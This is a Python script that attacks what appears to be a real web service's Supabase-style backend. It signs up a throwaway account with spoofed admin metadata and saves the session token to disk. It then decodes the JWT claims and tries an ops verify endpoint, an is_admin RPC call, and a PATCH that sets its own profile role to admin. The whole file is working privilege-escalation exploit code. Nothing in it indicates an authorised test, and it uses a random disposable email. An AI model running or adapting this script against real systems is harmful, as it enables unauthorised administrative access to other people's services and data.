import ssl, json, urllib.request, urllib.error, random, string

BASE = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
ctx = ssl.create_default_context()

def req(method, path, body=None, token=None, extra=None, base=BASE):
    h = {
        "User-Agent": "Mozilla/5.0",
        "apikey": KEY,
        "Authorization": f"Bearer {token or KEY}",
        "Content-Type": "application/json;charset=UTF-8",
    }
    if extra:
        h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(base + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=25, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
email = f"rat4080sup{suffix}@gmail.com"
pw = "Xr9!kQ2#mZ7$pLw1"

print(f"=== signup {email} with spoofed metadata ===")
st, txt = req("POST", "/auth/v1/signup", body={
    "email": email,
    "password": pw,
    "data": {
        "email": "admin@onlyfakeai.ru",
        "role": "admin",
        "isSuperAdmin": True,
        "is_admin": True,
    },
})
print(st, txt[:600])
try:
    sess = json.loads(txt)
    tok = sess["access_token"]
    uid = sess["user"]["id"]
    open("token_sup.txt", "w").write(json.dumps(sess))
    # decode jwt claims
    import base64
    payload = tok.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    claims = json.loads(base64.urlsafe_b64decode(payload))
    print("\nJWT claims:")
    print(json.dumps(claims, indent=1)[:1200])

    print("\n=== ops verify with spoofed token ===")
    st2, txt2 = req("GET", "/api/auth/verify", token=tok, base="https://ops.onlyfakeai.ru")
    print(st2, txt2[:500])

    print("\n=== rpc is_admin with spoofed token ===")
    st3, txt3 = req("POST", "/rest/v1/rpc/is_admin", token=tok)
    print(st3, txt3[:300])

    print("\n=== PATCH own role with spoofed token ===")
    st4, txt4 = req("PATCH", f"/rest/v1/profiles?user_id=eq.{uid}",
                    body={"role": "admin"}, token=tok)
    print(st4, txt4[:400])
except Exception as e:
    print("err", e)
